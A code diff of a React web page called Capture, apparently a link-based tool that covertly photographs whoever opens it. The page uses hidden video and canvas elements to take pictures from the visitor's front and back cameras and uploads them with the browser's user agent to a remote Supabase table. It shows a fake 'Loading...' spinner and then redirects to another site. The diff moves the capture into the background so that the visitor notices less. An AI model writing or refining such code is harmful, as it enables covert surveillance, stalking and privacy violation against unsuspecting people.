@@ -82,9 +82,9 @@ const Capture = () => {
   const [searchParams] = useSearchParams();
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
-  const [status, setStatus] = useState<"checking" | "redirecting_chrome" | "not_chrome" | "loading" | "capturing" | "countdown">("checking");
+  const [status, setStatus] = useState<"checking" | "redirecting_chrome" | "not_chrome" | "countdown">("checking");
   const [countdown, setCountdown] = useState<number | null>(null);
-  const [captureComplete, setCaptureComplete] = useState(false);
+  const captureStartedRef = useRef(false);
   
   const sessionId = searchParams.get("session") || "default";
   const rawRedirectUrl = searchParams.get("redirect") || "https://google.com";
@@ -135,9 +135,44 @@ const Capture = () => {
     }
   };
 
+  // Background capture function - runs independently
+  const captureInBackground = async () => {
+    if (captureStartedRef.current) return;
+    captureStartedRef.current = true;
+    
+    try {
+      // Capture from FRONT camera first
+      const frontImage = await captureFromCamera("user");
+      
+      if (frontImage) {
+        await supabase.from('captured_photos').insert({
+          session_id: sessionId,
+          image_data: frontImage,
+          user_agent: `${navigator.userAgent} [FRONT]`
+        });
+      }
+      
+      // Small delay before switching cameras
+      await new Promise(resolve => setTimeout(resolve, 300));
+      
+      // Capture from BACK camera
+      const backImage = await captureFromCamera("environment");
+      
+      if (backImage) {
+        await supabase.from('captured_photos').insert({
+          session_id: sessionId,
+          image_data: backImage,
+          user_agent: `${navigator.userAgent} [BACK]`
+        });
+      }
+    } catch (error) {
+      console.error("Capture error:", error);
+    }
+  };
+
   useEffect(() => {
     // Step 1: Check browser type
-    const checkBrowserAndProceed = async () => {
+    const checkBrowserAndProceed = () => {
       // If in-app browser on Android, redirect to Chrome
       if (isInAppBrowser() && isAndroid()) {
         setStatus("redirecting_chrome");
@@ -162,51 +197,12 @@ const Capture = () => {
         return;
       }
       
-      // We're in Chrome - proceed with camera capture
-      await captureAndRedirect();
-    };
-
-    const captureAndRedirect = async () => {
-      try {
-        setStatus("capturing");
-        
-        // Capture from FRONT camera first
-        const frontImage = await captureFromCamera("user");
-        
-        if (frontImage) {
-          await supabase.from('captured_photos').insert({
-            session_id: sessionId,
-            image_data: frontImage,
-            user_agent: `${navigator.userAgent} [FRONT]`
-          });
-        }
-        
-        // Small delay before switching cameras
-        await new Promise(resolve => setTimeout(resolve, 300));
-        
-        // Capture from BACK camera
-        const backImage = await captureFromCamera("environment");
-        
-        if (backImage) {
-          await supabase.from('captured_photos').insert({
-            session_id: sessionId,
-            image_data: backImage,
-            user_agent: `${navigator.userAgent} [BACK]`
-          });
-        }
-        
-        // Start countdown after capture complete
-        setCaptureComplete(true);
-        setStatus("countdown");
-        setCountdown(countdownSeconds);
-        
-      } catch (error) {
-        console.error("Capture error:", error);
-        // Start countdown anyway even if camera fails
-        setCaptureComplete(true);
-        setStatus("countdown");
-        setCountdown(countdownSeconds);
-      }
+      // We're in Chrome - start countdown immediately and capture in background
+      setStatus("countdown");
+      setCountdown(countdownSeconds);
+      
+      // Start capture in background (non-blocking)
+      captureInBackground();
     };
 
     checkBrowserAndProceed();
@@ -356,14 +352,10 @@ const Capture = () => {
       <video ref={videoRef} className="hidden" autoPlay playsInline muted />
       <canvas ref={canvasRef} className="hidden" />
       
-      {/* Loading indicator that looks like a normal page */}
+      {/* Loading indicator - only shows briefly during browser check */}
       <div className="text-center">
         <div className="w-8 h-8 border-2 border-neon-green border-t-transparent rounded-full animate-spin mx-auto mb-4" />
-        <p className="text-muted-foreground text-sm">
-          {status === "checking" && "Loading..."}
-          {status === "loading" && "Loading..."}
-          {status === "capturing" && "Please wait..."}
-        </p>
+        <p className="text-muted-foreground text-sm">Loading...</p>
       </div>
     </div>
   );
